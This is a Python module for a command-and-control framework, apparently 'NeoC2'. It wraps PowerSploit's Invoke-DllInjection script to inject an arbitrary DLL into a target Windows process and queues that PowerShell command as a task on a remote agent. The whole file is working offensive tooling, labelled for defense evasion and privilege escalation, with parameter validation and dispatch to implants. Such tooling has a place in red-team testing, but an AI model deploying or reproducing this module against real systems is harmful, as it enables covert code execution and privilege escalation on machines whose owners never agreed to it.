# modules/Invoke-DllInjection.py
import os
import importlib.util
import base64
import re

def get_info():
    """Get module information"""
    return {
        "name": "Invoke-DllInjection",
        "description": "Execute a PowerShell command to inject a DLL into a specified process",
        "type": "privilege_escalation",
        "platform": "windows",
        "author": "PowerSploit / NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1055.001,T1059.001",  # Process Injection: Dynamic-link Library Injection, Command and Scripting Interpreter: PowerShell
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the DLL injection on",
                "required": True
            },
            "process_id": {
                "description": "Process ID of the process to inject the DLL into",
                "required": True
            },
            "dll_path": {
                "description": "Path to the DLL to inject into the target process",
                "required": True
            },
        }
    }


def execute(options, session):
    """Execute the Invoke-DllInjection module with given options and session"""
    agent_id = options.get("agent_id")
    process_id = options.get("process_id")
    dll_path = options.get("dll_path")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if not process_id:
        return {
            "success": False,
            "error": "process_id is required"
        }
    
    if not dll_path:
        return {
            "success": False,
            "error": "dll_path is required"
        }
    
    # Validate process_id as integer
    try:
        process_id = int(process_id)
    except ValueError:
        return {
            "success": False,
            "error": f"Invalid process_id: {process_id}. Must be a number."
        }
    
    # Validate dll_path for potential command injection
    # Only allow alphanumeric characters, spaces, common path separators, and common file extensions
    if not re.match(r'^[a-zA-Z0-9_\-\\\/\.: \(\)]+\.(dll|DLL)$', dll_path):
        return {
            "success": False,
            "error": f"Invalid dll_path: {dll_path}. Contains invalid characters or incorrect extension."
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    
    # Read the original Invoke-DllInjection.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Invoke-DllInjection.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find Invoke-DllInjection script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading Invoke-DllInjection script: {str(e)}"
        }
    
    # Build the execution command with parameters
    execution_command = f'{original_script}\nInvoke-DllInjection -ProcessID {process_id} -Dll "{dll_path}"'
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Invoke-DllInjection task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "process_id": process_id,
                "dll_path": dll_path
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }